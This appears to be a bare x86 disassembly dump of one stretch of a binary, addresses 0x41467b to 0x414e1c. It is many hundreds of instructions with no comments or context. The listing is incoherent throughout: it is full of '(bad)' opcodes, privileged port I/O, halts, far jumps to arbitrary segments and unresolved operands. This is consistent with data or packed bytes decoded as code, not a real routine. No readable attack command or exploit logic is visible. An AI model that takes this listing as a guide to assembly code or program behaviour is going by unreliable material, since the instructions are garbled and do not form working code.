  41467b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41467c:	pop    esi
  41467d:	cmp    ah,BYTE PTR [ecx+0x6e]
  414680:	sbb    dl,BYTE PTR [ebp+ebp*2-0x5174f771]
  414687:	jecxz  0x414664
  414689:	into   
  41468a:	or     cl,BYTE PTR [ecx]
  41468c:	cmp    DWORD PTR [edi+ecx*2],0xeb058cdb
  414693:	jno    0x41465a
  414695:	test   BYTE PTR [ebx-0x74],0x99
  414699:	test   al,0x63
  41469b:	leave  
  41469c:	outs   dx,DWORD PTR ds:[esi]
  41469d:	loope  0x414631
  41469f:	mov    bh,0x7d
  4146a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146a2:	hlt    
  4146a3:	dec    ebp
  4146a4:	add    DWORD PTR [edx],0x9a9edc17
  4146aa:	or     al,0x54
  4146ac:	jg     0x414631
  4146ae:	xchg   BYTE PTR [edx-0x7b],dh
  4146b1:	push   ecx
  4146b2:	xor    al,0xdf
  4146b4:	shr    DWORD PTR [ebx-0x61],1
  4146b7:	push   ebp
  4146b8:	add    bl,ah
  4146ba:	(bad)  
  4146bb:	test   BYTE PTR [ebx+ebx*1],cl
  4146be:	aam    0x2b
  4146c0:	cmc    
  4146c1:	xchg   edi,eax
  4146c2:	xor    DWORD PTR [ebx-0x6ec69754],ebp
  4146c8:	outs   dx,DWORD PTR ds:[esi]
  4146c9:	imul   ecx,DWORD PTR [eax+esi*4+0x20],0xab96eecc
  4146d1:	push   0xffffffe2
  4146d3:	inc    esp
  4146d4:	mov    ?,WORD PTR [edi]
  4146d6:	sub    dl,BYTE PTR [edx]
  4146d8:	mov    ch,0xfd
  4146da:	lods   eax,DWORD PTR ds:[esi]
  4146db:	stos   BYTE PTR es:[edi],al
  4146dc:	sub    ebx,0x51b86f73
  4146e2:	int3   
  4146e3:	daa    
  4146e4:	int    0x72
  4146e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146e7:	mov    cl,0x49
  4146e9:	bound  ecx,QWORD PTR [ecx]
  4146eb:	adc    al,0x89
  4146ed:	jmp    0x414698
  4146ef:	push   edi
  4146f0:	sti    
  4146f1:	cmp    BYTE PTR [ebx],dl
  4146f3:	add    ecx,edx
  4146f5:	ror    ah,1
  4146f7:	jecxz  0x41468b
  4146f9:	jbe    0x414723
  4146fb:	mov    ebx,0x46c694b5
  414700:	not    BYTE PTR [edi-0x1219d49f]
  414706:	outs   dx,DWORD PTR ds:[esi]
  414707:	cdq    
  414708:	shl    BYTE PTR [ebp-0x25],0x84
  41470c:	jge    0x4146c8
  41470e:	inc    esi
  41470f:	aas    
  414710:	or     ah,BYTE PTR [ebx+ecx*4+0x5667b648]
  414717:	cmc    
  414718:	or     al,0x42
  41471a:	and    al,0xf1
  41471c:	in     eax,dx
  41471d:	adc    edx,ecx
  41471f:	push   0x27438a9e
  414724:	mov    bl,0xa3
  414726:	mov    edi,esi
  414728:	lods   eax,DWORD PTR ds:[esi]
  414729:	retf   
  41472a:	and    al,0x71
  41472c:	pop    ds
  41472d:	dec    edi
  41472e:	into   
  41472f:	push   0x32
  414731:	cwde   
  414732:	fsubr  DWORD PTR [esi]
  414734:	int3   
  414735:	ret    
  414736:	mov    al,ds:0xf81ce11b
  41473b:	(bad)  
  41473c:	push   0xffffff94
  41473e:	mov    bh,0x2d
  414740:	xor    BYTE PTR [eax],bh
  414742:	or     eax,0xe0dc94c
  414747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414748:	sub    bh,BYTE PTR [eax]
  41474a:	aas    
  41474b:	js     0x4147b6
  41474d:	mov    WORD PTR [ebx],?
  41474f:	push   esi
  414750:	retf   
  414751:	xchg   esi,eax
  414752:	xchg   ecx,eax
  414753:	fnstenv [ebp+esi*8-0x10]
  414757:	jns    0x4147af
  414759:	xchg   ebp,eax
  41475a:	or     al,BYTE PTR cs:[ebx-0x512c305a]
  414761:	cwde   
  414762:	call   0x4e6e870e
  414767:	mov    eax,ds:0xf4710b21
  41476c:	jbe    0x4147df
  41476e:	stc    
  41476f:	pop    esi
  414770:	fst    DWORD PTR [ecx-0x3f]
  414773:	leave  
  414774:	mov    ds:0x81c6f464,al
  414779:	and    DWORD PTR [edx-0x71],0xffffffbf
  41477d:	or     edi,ebp
  41477f:	inc    ecx
  414780:	or     eax,0x85aa1b78
  414785:	xor    DWORD PTR [ecx-0x3b],eax
  414788:	bound  edi,QWORD PTR [edx-0x3b]
  41478b:	mov    al,ds:0x8918072e
  414790:	add    BYTE PTR [esi*1-0x136c9573],0x64
  414798:	dec    ebp
  414799:	or     eax,0x1925e72c
  41479e:	adc    eax,0x6fac48cf
  4147a3:	(bad)  
  4147a4:	in     al,0x90
  4147a6:	test   ah,cl
  4147a8:	pop    esp
  4147a9:	hlt    
  4147aa:	in     al,dx
  4147ab:	pop    ebp
  4147ac:	pop    esp
  4147ad:	out    dx,al
  4147ae:	cld    
  4147af:	mov    ds:0x9deab1a,al
  4147b4:	int3   
  4147b5:	test   DWORD PTR [eax+0x6ff77242],0xa9a76d4b
  4147bf:	dec    ebx
  4147c0:	and    DWORD PTR [ecx-0x11],ebx
  4147c3:	sbb    eax,0x52ec288b
  4147c8:	dec    esi
  4147c9:	cwde   
  4147ca:	cmp    DWORD PTR [eax+0x5450b45f],ebx
  4147d0:	pop    edi
  4147d1:	dec    esi
  4147d2:	mov    edi,0xdc4af5c1
  4147d7:	bnd gs ret 0x296e
  4147dc:	push   ss
  4147dd:	lods   eax,DWORD PTR ds:[esi]
  4147de:	hlt    
  4147df:	jne    0x414840
  4147e1:	mov    al,ds:0xc54045b4
  4147e6:	mov    ds:0x4ad0368b,eax
  4147eb:	out    dx,eax
  4147ec:	out    0xe5,eax
  4147ee:	sti    
  4147ef:	mov    ecx,cs
  4147f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147f2:	aam    0x38
  4147f4:	rcl    ch,1
  4147f6:	push   ds
  4147f7:	test   DWORD PTR [ebx],ebx
  4147f9:	repz push ds
  4147fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147fc:	fistp  QWORD PTR [eax]
  4147fe:	mov    DWORD PTR [edx+0x71],ebx
  414801:	(bad)  
  414803:	mov    ds:0x6917c4b0,al
  414808:	adc    ecx,DWORD PTR [ecx]
  41480a:	fadd   st,st(4)
  41480c:	inc    edi
  41480d:	ret    
  41480e:	arpl   WORD PTR [ecx+0x3a20a526],ax
  414814:	xor    DWORD PTR [eax],esp
  414816:	dec    ecx
  414817:	push   ebx
  414818:	shl    DWORD PTR [ecx+0x1a],cl
  41481b:	or     ebp,0xfffffffe
  41481e:	mov    eax,0x4561d7e
  414823:	mov    WORD PTR [ebp+0x3214b8be],ds
  414829:	cmp    eax,edi
  41482b:	ss mov al,0x6d
  41482e:	xor    eax,edi
  414830:	arpl   WORD PTR [esi],dx
  414832:	lea    eax,[ebp+0x1e3cf4b5]
  414838:	jecxz  0x4147d6
  41483a:	ins    BYTE PTR es:[edi],dx
  41483b:	in     eax,dx
  41483c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41483d:	pop    esp
  41483e:	lods   eax,DWORD PTR ds:[esi]
  41483f:	das    
  414840:	xchg   ebp,eax
  414841:	out    0x43,al
  414843:	jno    0x414832
  414845:	push   edx
  414846:	adc    ch,bh
  414848:	iret   
  414849:	popa   
  41484a:	sub    al,0x2
  41484c:	adc    DWORD PTR [esp+ebp*8-0x426b217],esp
  414853:	or     BYTE PTR [edi-0x7d],dl
  414856:	test   al,0xa9
  414858:	adc    edi,DWORD PTR [eax+ebp*2+0x4fa34ac1]
  41485f:	mov    bh,0xdc
  414861:	lods   eax,DWORD PTR ds:[esi]
  414862:	push   eax
  414863:	ret    0xf354
  414866:	dec    ecx
  414867:	push   ecx
  414868:	jmp    0x4148c4
  41486a:	dec    eax
  41486b:	in     eax,0x48
  41486d:	mov    ?,eax
  41486f:	jne    0x4148a7
  414871:	jmp    0xd1aa7714
  414876:	push   ebx
  414877:	loopne 0x4148a5
  414879:	xor    eax,0x6674c638
  41487e:	and    ecx,DWORD PTR [esi-0x36b34366]
  414884:	ja     0x4148dc
  414886:	xchg   DWORD PTR [ebx-0x48],eax
  414889:	cmp    eax,0x5c325607
  41488e:	arpl   dx,bp
  414890:	aad    0xd4
  414892:	pop    ebp
  414893:	fisubr WORD PTR [edi+eax*1-0x33]
  414897:	jmp    0x4148ca
  414899:	pop    esi
  41489a:	jecxz  0x41490d
  41489c:	sub    ebp,DWORD PTR [ebp-0x68]
  41489f:	pop    edx
  4148a0:	jle    0x4148bd
  4148a2:	push   esp
  4148a3:	mov    esp,0x94f95029
  4148a8:	cs jge 0x4148ba
  4148ab:	push   edx
  4148ac:	js     0x4148f7
  4148ae:	xor    ch,BYTE PTR [ebx-0x80]
  4148b1:	mov    dh,0x1c
  4148b3:	add    ah,BYTE PTR [ecx]
  4148b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148b6:	shl    bl,0x82
  4148b9:	push   ecx
  4148ba:	inc    edx
  4148bb:	mov    edi,0x1f6cbdab
  4148c0:	xor    eax,0xf2b84b9c
  4148c5:	push   0x20
  4148c7:	outs   dx,DWORD PTR ds:[esi]
  4148c8:	loope  0x4148f9
  4148ca:	mov    edi,0x7024902f
  4148cf:	adc    eax,0x3253663
  4148d4:	sahf   
  4148d5:	mov    cl,0x6b
  4148d7:	xchg   esp,eax
  4148d9:	xor    edi,DWORD PTR [eax]
  4148db:	ret    0xcff9
  4148de:	xor    DWORD PTR [esi+ebp*4+0x50],eax
  4148e2:	sahf   
  4148e3:	adc    DWORD PTR [ebp+ecx*1-0x98b7f7e],esp
  4148ea:	imul   edi,DWORD PTR [edx],0x37
  4148ed:	cmp    BYTE PTR ds:0x3550cfbe,al
  4148f3:	dec    edi
  4148f4:	sbb    ah,BYTE PTR ds:0xc725269
  4148fa:	dec    ecx
  4148fb:	mov    eax,0xe0899a4
  414900:	aaa    
  414901:	inc    ebx
  414902:	mov    ecx,0x6dd0b6a9
  414907:	cs out 0x55,eax
  41490a:	mov    bh,0xb6
  41490c:	sub    cl,ah
  41490e:	add    eax,DWORD PTR [ebx+0x6d]
  414911:	fiadd  DWORD PTR [ebx-0xa8375cf]
  414917:	daa    
  414918:	mov    ebx,0x142ef109
  41491d:	ins    DWORD PTR es:[edi],dx
  41491e:	jae    0x414937
  414920:	sti    
  414921:	mov    WORD PTR [ebx],es
  414923:	mov    esp,DWORD PTR [edx]
  414925:	sbb    BYTE PTR [edi],0x27
  414928:	ss hlt 
  41492a:	ficomp WORD PTR ds:0xb7924df4
  414930:	and    al,0x3e
  414932:	xor    al,0xa0
  414934:	or     al,0x9a
  414936:	adc    al,0x26
  414938:	outs   dx,DWORD PTR ds:[esi]
  414939:	xor    eax,0xe1e220f7
  41493e:	mov    eax,0x17ea517b
  414943:	lods   al,BYTE PTR ds:[esi]
  414944:	lea    eax,[esp+edi*1]
  414947:	ficomp DWORD PTR [eax+0x36038dec]
  41494d:	inc    ecx
  41494e:	(bad)  
  41494f:	sti    
  414950:	stc    
  414951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414952:	loopne 0x414903
  414954:	mov    dh,0x44
  414956:	mov    ?,WORD PTR [edx+0x36e7d1d1]
  41495c:	loope  0x4148e8
  41495e:	lock jae 0x414924
  414961:	in     eax,dx
  414962:	mov    eax,ds:0xb1a984d
  414967:	les    ebp,FWORD PTR [edx+0x72]
  41496a:	je     0x41498d
  41496c:	inc    ecx
  41496d:	cmp    BYTE PTR [ebx],dh
  41496f:	(bad)  
  414970:	pop    edi
  414971:	leave  
  414972:	mov    ecx,0x44bbfade
  414977:	inc    esi
  414978:	aam    0x44
  41497a:	xor    al,BYTE PTR [ebp+0x233dd471]
  414980:	sbb    dl,BYTE PTR [edi+0x47]
  414983:	(bad)  
  414984:	mov    al,ds:0x5c0fa573
  414989:	xor    BYTE PTR [edi+0x5],cl
  41498c:	retf   0x9950
  41498f:	jmp    0x217e:0x6af85eba
  414996:	scas   eax,DWORD PTR es:[edi]
  414997:	inc    edx
  414998:	push   eax
  414999:	push   ss
  41499a:	xchg   esp,eax
  41499b:	jmp    0xdda7:0x94589c61
  4149a2:	mov    ebp,0xeaa352a9
  4149a7:	jbe    0x4149d4
  4149a9:	xor    dh,BYTE PTR [eax+0x25]
  4149ac:	jae    0x41497f
  4149ae:	outs   dx,BYTE PTR ds:[esi]
  4149af:	jno    0x414986
  4149b1:	pop    ecx
  4149b2:	imul   ecx,ebx,0x26545a91
  4149b8:	leave  
  4149b9:	fwait
  4149ba:	add    ebx,DWORD PTR [eax]
  4149bc:	pusha  
  4149bd:	into   
  4149be:	arpl   WORD PTR [esi+0x6f7d4f67],sp
  4149c4:	cdq    
  4149c5:	daa    
  4149c6:	sbb    ch,bl
  4149c8:	adc    DWORD PTR [ebx],eax
  4149ca:	adc    bh,cl
  4149cc:	rol    DWORD PTR [ecx],1
  4149ce:	xor    eax,0x2dfaf9b0
  4149d3:	adc    esi,esp
  4149d5:	push   eax
  4149d6:	lods   al,BYTE PTR ds:[esi]
  4149d7:	repnz leave 
  4149d9:	popf   
  4149da:	jp     0x414961
  4149dc:	repnz xchg ecx,eax
  4149de:	arpl   si,bp
  4149e0:	cmc    
  4149e1:	outs   dx,BYTE PTR ds:[esi]
  4149e2:	jae    0x4149b7
  4149e4:	ficomp DWORD PTR ds:0x2c5794bc
  4149ea:	adc    ecx,DWORD PTR [ebx+0x6b]
  4149ed:	mov    DWORD PTR [edx],eax
  4149ef:	inc    edx
  4149f0:	pushw  es
  4149f2:	and    DWORD PTR [edi+0x2ce4e2cb],esp
  4149f8:	pop    esp
  4149f9:	cmp    ah,BYTE PTR [ecx+eiz*8]
  4149fc:	jae    0x4149f4
  4149fe:	xchg   esp,eax
  4149ff:	pushf  
  414a00:	push   ecx
  414a01:	sbb    BYTE PTR [ebp+0x2db91aa3],ch
  414a07:	or     DWORD PTR [edx+0x782a3c47],esi
  414a0d:	mov    ebx,0xae728d97
  414a12:	sub    DWORD PTR [ecx-0x4d8e14fa],esi
  414a18:	in     al,dx
  414a19:	popa   
  414a1a:	dec    edi
  414a1b:	mov    ecx,0x4719de7c
  414a20:	dec    ecx
  414a21:	iret   
  414a22:	test   BYTE PTR [eax+0x40ae2cf0],bh
  414a28:	mov    eax,ds:0xca80b2f2
  414a2d:	call   0x5f50:0x1b562a77
  414a34:	aad    0x68
  414a36:	or     eax,0xf23a9efb
  414a3b:	dec    ebp
  414a3c:	loopne 0x4149f0
  414a3e:	mov    eax,gs:0xb993b93d
  414a44:	push   ds
  414a45:	bound  ebp,QWORD PTR [edx]
  414a47:	sub    DWORD PTR [edi+0x3653eab7],esp
  414a4d:	inc    esp
  414a4e:	jmp    0x1023:0xaa2f41dc
  414a55:	mov    WORD PTR ds:0x606c9a32,fs
  414a5b:	or     bl,BYTE PTR [edx+ebx*8-0x78]
  414a5f:	dec    esp
  414a60:	aam    0x86
  414a62:	or     al,dh
  414a64:	mov    esp,0xb08b5761
  414a69:	out    dx,eax
  414a6a:	in     al,0xdd
  414a6c:	pop    ds
  414a6d:	xor    eax,0x5490070f
  414a72:	adc    al,0xe5
  414a74:	sub    ecx,edx
  414a76:	jp     0x414a60
  414a78:	outs   dx,BYTE PTR ds:[esi]
  414a79:	loopne 0x414a9f
  414a7b:	cmp    al,al
  414a7d:	sti    
  414a7e:	mov    eax,ds:0x3988928a
  414a83:	mov    al,0x21
  414a85:	or     ah,dl
  414a87:	dec    edx
  414a88:	cmp    BYTE PTR [edi],bl
  414a8a:	test   eax,0x55ccb4d3
  414a8f:	inc    ebx
  414a90:	lahf   
  414a91:	or     DWORD PTR [ebx+0x66ece5c6],edi
  414a97:	ins    BYTE PTR es:[edi],dx
  414a98:	shr    DWORD PTR [edi+0x57b7bf59],cl
  414a9e:	sti    
  414a9f:	mov    dl,bl
  414aa1:	ins    BYTE PTR es:[edi],dx
  414aa2:	sbb    al,0x12
  414aa4:	jno    0x414a2e
  414aa6:	pushf  
  414aa7:	cmp    ebx,DWORD PTR [ebp+0x50]
  414aaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414aab:	push   ds
  414aac:	sbb    al,0xe6
  414aae:	inc    ecx
  414aaf:	daa    
  414ab0:	pop    esi
  414ab1:	leave  
  414ab2:	xchg   DWORD PTR [eax-0x4a],ebx
  414ab5:	in     eax,0x8c
  414ab7:	mov    BYTE PTR [esi+esi*8-0xc],0xa8
  414abc:	jnp    0x414ad6
  414abe:	aas    
  414abf:	mov    ch,0x37
  414ac1:	pop    edx
  414ac2:	push   eax
  414ac3:	int3   
  414ac4:	lock pop ss
  414ac6:	jmp    0xf83f3e98
  414acb:	push   0xf67ae188
  414ad0:	inc    esp
  414ad1:	xchg   ecx,eax
  414ad2:	mov    DWORD PTR [eax+0x31],edi
  414ad5:	dec    ebp
  414ad6:	je     0x414ab1
  414ad8:	in     al,dx
  414ad9:	imul   ecx,esp,0x3d2801f5
  414adf:	daa    
  414ae0:	loopne 0x414b4f
  414ae2:	repz push ebp
  414ae4:	hlt    
  414ae5:	dec    ecx
  414ae6:	sbb    DWORD PTR [ebp+0x3602f909],eax
  414aec:	pop    esi
  414aed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aee:	xchg   DWORD PTR [edi-0x48823f77],ebx
  414af4:	ffreep st(1)
  414af6:	out    dx,eax
  414af7:	fwait
  414af8:	add    esi,DWORD PTR [esi-0x2c13c201]
  414afe:	sub    esi,esp
  414b00:	jle    0x414b36
  414b02:	jnp    0x414acc
  414b04:	cmp    eax,0x8831164f
  414b09:	imul   esp,DWORD PTR [ecx],0x10
  414b0c:	or     eax,0xfe0e7297
  414b11:	std    
  414b12:	xlat   BYTE PTR ds:[ebx]
  414b13:	cmc    
  414b14:	cmp    al,0xd3
  414b16:	cmp    ch,BYTE PTR [ebp-0x1b1c0b95]
  414b1c:	jle    0x414afe
  414b1e:	inc    eax
  414b1f:	shl    BYTE PTR [edx+0x770034a5],cl
  414b25:	arpl   di,si
  414b27:	into   
  414b28:	sbb    edi,DWORD PTR [ebx]
  414b2a:	cmp    cl,BYTE PTR [edx+ebx*1+0x43]
  414b2e:	gs shl cl,0xd6
  414b32:	mov    DWORD PTR [ebx+0x10b7e8c6],ebx
  414b38:	pop    ebx
  414b39:	les    esi,FWORD PTR [ebp+0x4b]
  414b3c:	or     DWORD PTR [ebx],edx
  414b3e:	call   0x9d32:0x85e76009
  414b45:	(bad)  
  414b46:	leave  
  414b47:	or     BYTE PTR [eax-0x64],bl
  414b4a:	xchg   edx,eax
  414b4b:	cmp    DWORD PTR [eax-0x3e],ecx
  414b4e:	cwde   
  414b4f:	fist   DWORD PTR [eax-0x5b]
  414b52:	push   edi
  414b53:	out    0x6d,eax
  414b55:	jo     0x414b84
  414b57:	mov    ecx,0x96f85099
  414b5c:	sbb    BYTE PTR [esi+0x2f154b96],dl
  414b62:	mov    WORD PTR [edx-0x79],ds
  414b65:	mov    bl,0x7d
  414b67:	fld    DWORD PTR [ebx+0x8]
  414b6a:	cmp    ecx,ecx
  414b6c:	or     BYTE PTR [esi+edi*4],ch
  414b6f:	scas   al,BYTE PTR es:[edi]
  414b70:	daa    
  414b71:	push   cs
  414b72:	je     0x414be6
  414b74:	fcmove st,st(2)
  414b76:	jge    0x414b31
  414b78:	scas   eax,DWORD PTR es:[edi]
  414b79:	fdivr  QWORD PTR [eax+ebp*4-0x36ebf16]
  414b80:	and    dh,BYTE PTR [ebx+0xb5fda3b]
  414b86:	adc    BYTE PTR [edi],al
  414b88:	call   DWORD PTR [edx]
  414b8a:	mov    eax,ds:0x122b5b5b
  414b8f:	enter  0xa9a4,0xcc
  414b93:	jne    0x414bcb
  414b95:	scas   eax,DWORD PTR es:[edi]
  414b96:	in     eax,0x46
  414b98:	cmp    eax,0x6bde0177
  414b9d:	pusha  
  414b9e:	pop    ds
  414b9f:	inc    eax
  414ba0:	imul   ebp,DWORD PTR [ebx-0x77],0x3196db2d
  414ba7:	mov    edx,0xdedb1b59
  414bac:	inc    ebp
  414bad:	xlat   BYTE PTR ds:[ebx]
  414bae:	jnp    0x414c1a
  414bb0:	aaa    
  414bb1:	xchg   BYTE PTR [edx+0x30],bh
  414bb4:	aaa    
  414bb5:	or     eax,0xd94ae6cd
  414bba:	js     0x414be5
  414bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bbd:	xor    al,0x4
  414bbf:	sub    DWORD PTR [ecx-0x5a3e115c],0x2
  414bc6:	call   0x1617:0xd7911672
  414bcd:	jg     0x414b55
  414bcf:	mov    DWORD PTR [eax],eax
  414bd1:	lds    esp,FWORD PTR [ebx+0x266e2524]
  414bd7:	test   eax,0x921480ca
  414bdc:	pusha  
  414bdd:	mov    ebx,0x8a26d8ca
  414be2:	mov    dl,0x4f
  414be4:	adc    BYTE PTR [ecx-0x77],bl
  414be7:	pop    esp
  414be8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414be9:	call   0xe31c:0xfb7d06b7
  414bf0:	or     bl,BYTE PTR [ecx+0x28]
  414bf3:	sbb    eax,0x69ebb61d
  414bf8:	xchg   ecx,eax
  414bf9:	(bad)  
  414bfa:	fwait
  414bfb:	dec    ebx
  414bfc:	pop    esi
  414bfd:	add    eax,0x180f130e
  414c02:	in     al,dx
  414c03:	xchg   DWORD PTR [edx-0x405cce3f],ebp
  414c09:	xor    BYTE PTR [ebp-0x13],cl
  414c0c:	lods   al,BYTE PTR ds:[esi]
  414c0d:	cld    
  414c0e:	retf   
  414c0f:	jg     0x414c39
  414c11:	test   ebp,eax
  414c13:	cmp    ah,BYTE PTR [esi-0x55]
  414c16:	fwait
  414c17:	inc    esi
  414c18:	fcomp  QWORD PTR [eax]
  414c1a:	test   al,0x55
  414c1c:	fs hlt 
  414c1e:	mov    dh,0x11
  414c20:	fmul   DWORD PTR [edi+0x15f1c2ad]
  414c26:	out    0x0,al
  414c28:	shl    DWORD PTR [ebp+0x42],1
  414c2b:	dec    ecx
  414c2c:	test   al,0xd3
  414c2e:	xlat   BYTE PTR ds:[ebx]
  414c2f:	scas   eax,DWORD PTR es:[edi]
  414c30:	add    DWORD PTR [esi+ebp*4+0x4fb981],edx
  414c37:	cmp    eax,0x5e1933dd
  414c3c:	adc    eax,0xe53c4e30
  414c41:	(bad)  
  414c42:	pop    edi
  414c43:	sbb    al,0xed
  414c45:	inc    edi
  414c46:	mov    al,ds:0x39e3b972
  414c4b:	mov    dh,0x3f
  414c4d:	sub    al,BYTE PTR cs:[ebx*2+0x41c6dbd1]
  414c55:	push   es
  414c56:	lods   eax,DWORD PTR ds:[esi]
  414c57:	loopne 0x414c5e
  414c59:	sub    al,0x76
  414c5b:	cli    
  414c5c:	dec    edx
  414c5d:	in     al,dx
  414c5e:	or     eax,0x24b060e0
  414c63:	xchg   esi,eax
  414c64:	mov    al,ds:0xfc2a702f
  414c69:	mov    ebx,0x4ff8d4dd
  414c6e:	adc    eax,0xf1841349
  414c73:	rcl    BYTE PTR [ebx],cl
  414c75:	inc    eax
  414c76:	jp     0x414c13
  414c78:	rcl    BYTE PTR [esi+0x19b52ccf],0x1c
  414c7f:	iret   
  414c80:	and    ebp,edi
  414c82:	dec    edx
  414c83:	and    edx,DWORD PTR [eax-0x4e]
  414c86:	adc    edi,DWORD PTR [esi-0x5c]
  414c89:	out    dx,eax
  414c8a:	pop    es
  414c8b:	inc    esp
  414c8c:	aad    0x6
  414c8e:	mov    ds:0xe8ad3a08,eax
  414c93:	iret   
  414c94:	push   cs
  414c95:	mov    ebp,0x360ee6e1
  414c9a:	lods   al,BYTE PTR ds:[esi]
  414c9b:	pop    esi
  414c9c:	xlat   BYTE PTR ds:[ebx]
  414c9d:	xchg   esi,eax
  414c9e:	ss loope 0x414c25
  414ca1:	inc    esi
  414ca2:	cli    
  414ca3:	add    ebp,DWORD PTR [ebx+0x29f84b35]
  414ca9:	sti    
  414caa:	jae    0x414cc7
  414cac:	add    edx,DWORD PTR [edx]
  414cae:	sti    
  414caf:	mov    BYTE PTR [edi-0x4e3830c4],bh
  414cb5:	(bad)  
  414cb6:	rol    DWORD PTR [ebx],1
  414cb8:	ins    DWORD PTR es:[edi],dx
  414cb9:	push   edi
  414cba:	mov    ebp,0x3be9cedb
  414cbf:	shl    DWORD PTR ds:0x6de07301,0x20
  414cc6:	push   cs
  414cc7:	mov    ebx,0x3b36d97
  414ccc:	repz jmp 0x414ce7
  414ccf:	ins    BYTE PTR es:[edi],dx
  414cd0:	jb     0x414ce7
  414cd2:	pop    esi
  414cd3:	fs dec ecx
  414cd5:	jno    0x414ca0
  414cd7:	in     eax,dx
  414cd8:	and    eax,0x81c54512
  414cdd:	adc    al,cl
  414cdf:	jmp    0x414c72
  414ce1:	push   eax
  414ce2:	pop    ecx
  414ce3:	es jb  0x414d3f
  414ce6:	push   DWORD PTR [esi+0x43]
  414ce9:	dec    edx
  414cea:	sti    
  414ceb:	and    bl,ah
  414ced:	dec    edi
  414cee:	popa   
  414cef:	jno    0x2a7432e8
  414cf5:	jge    0x414d54
  414cf7:	shl    DWORD PTR [ebp+0x38],cl
  414cfa:	ss mov bh,0x13
  414cfd:	push   edx
  414cfe:	scas   eax,DWORD PTR es:[edi]
  414cff:	add    ah,BYTE PTR [edx-0x54]
  414d02:	pop    edx
  414d03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d04:	xor    eax,0xa4aad332
  414d09:	adc    BYTE PTR [ebx],bh
  414d0b:	cli    
  414d0c:	inc    esp
  414d0d:	cmp    al,0x6c
  414d0f:	pop    ecx
  414d10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d11:	push   0xffffff98
  414d13:	mov    bl,0xb2
  414d15:	sbb    cl,dl
  414d17:	jecxz  0x414d59
  414d19:	xor    BYTE PTR [ebp-0x3545c7fc],al
  414d1f:	cmp    edx,esp
  414d21:	out    0x4a,eax
  414d23:	addr16 xor ebx,edi
  414d26:	pop    edi
  414d27:	mul    BYTE PTR [eax-0x213fb9ad]
  414d2d:	jb     0x414d3f
  414d2f:	xor    DWORD PTR [edi],edx
  414d31:	into   
  414d32:	and    dh,bh
  414d34:	xchg   ebx,eax
  414d35:	xchg   ebp,eax
  414d36:	cs cwde 
  414d38:	int    0x57
  414d3a:	rcl    BYTE PTR [edx],1
  414d3c:	retf   0x43e8
  414d3f:	and    edx,esp
  414d41:	add    al,0x3b
  414d43:	mov    esi,0xbfd12c6d
  414d48:	test   BYTE PTR ds:0xd6a72b61,ah
  414d4e:	pop    es
  414d4f:	stos   DWORD PTR es:[edi],eax
  414d50:	in     al,dx
  414d51:	mov    WORD PTR [ebp+0x12],?
  414d54:	addr16 pushf 
  414d56:	cmp    BYTE PTR [esi+0x1b],ah
  414d59:	adc    BYTE PTR [ebx+0x6723475b],0x2d
  414d60:	sbb    ch,BYTE PTR [esi+eax*2+0x1c8b9fa5]
  414d67:	mov    eax,cs
  414d69:	repz push ds
  414d6b:	std    
  414d6c:	bnd ja 0x414d0c
  414d6f:	pop    ebx
  414d70:	or     DWORD PTR [ecx+0x1dc9458a],0x2e562ffb
  414d7a:	pop    ss
  414d7b:	daa    
  414d7c:	cwde   
  414d7d:	mov    dh,0x63
  414d7f:	or     eax,0x3ddc7428
  414d84:	or     eax,0xa9b9ac6
  414d89:	repz mov al,ds:0xce7cd84a
  414d8f:	xchg   DWORD PTR [esi-0x7],ebp
  414d92:	xor    dl,BYTE PTR [ecx]
  414d94:	arpl   WORD PTR [ecx],bx
  414d96:	fbld   TBYTE PTR [esi+0x7c]
  414d99:	lds    edx,FWORD PTR [edx]
  414d9b:	cs loop 0x414dda
  414d9e:	jo     0x414d4e
  414da0:	adc    eax,DWORD PTR ds:[esi]
  414da3:	test   BYTE PTR [ebp+0x736cbee],bh
  414da9:	jne    0x414d8c
  414dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dac:	mov    edi,0xeeb54eae
  414db1:	inc    ch
  414db3:	(bad)  
  414db4:	pop    edi
  414db5:	mov    eax,ds:0xc358226d
  414dba:	push   0xe2f86fda
  414dbf:	push   eax
  414dc0:	dec    eax
  414dc1:	mov    al,ds:0xf4d2f1b2
  414dc6:	xchg   ebp,eax
  414dc7:	pop    ss
  414dc8:	add    BYTE PTR [ebp-0x57767a40],dh
  414dce:	out    0xc4,al
  414dd0:	sbb    BYTE PTR [edi-0x79],ch
  414dd3:	loop   0x414e52
  414dd5:	jge    0x414dd0
  414dd7:	sub    eax,0xbb4e597a
  414ddc:	xlat   BYTE PTR ds:[ebx]
  414ddd:	out    dx,eax
  414dde:	jbe    0x414dd4
  414de0:	inc    esi
  414de1:	xor    ecx,ebp
  414de3:	and    al,0x34
  414de5:	or     dl,BYTE PTR [edi+0x51f7a14e]
  414deb:	in     eax,dx
  414dec:	test   eax,0x4b505e85
  414df1:	dec    edi
  414df2:	or     DWORD PTR [eax+0x28ebf550],ebp
  414df8:	or     eax,0xa7ae06b4
  414dfd:	dec    ecx
  414dfe:	jns    0x414e44
  414e00:	xchg   edi,eax
  414e01:	or     al,BYTE PTR ds:0x71f054c6
  414e07:	pop    es
  414e08:	repnz arpl WORD PTR [ebp-0x4b246415],si
  414e0f:	pop    esi
  414e10:	daa    
  414e11:	fild   QWORD PTR [eax]
  414e13:	scas   eax,DWORD PTR es:[edi]
  414e14:	xchg   edi,eax
  414e15:	xchg   esp,eax
  414e16:	pop    edi
  414e17:	adc    ebx,DWORD PTR [ebx]
  414e19:	xor    ebp,esp
  414e1b:	cdq    
  414e1c:	outs   dx,BYTE PTR ds:[esi]
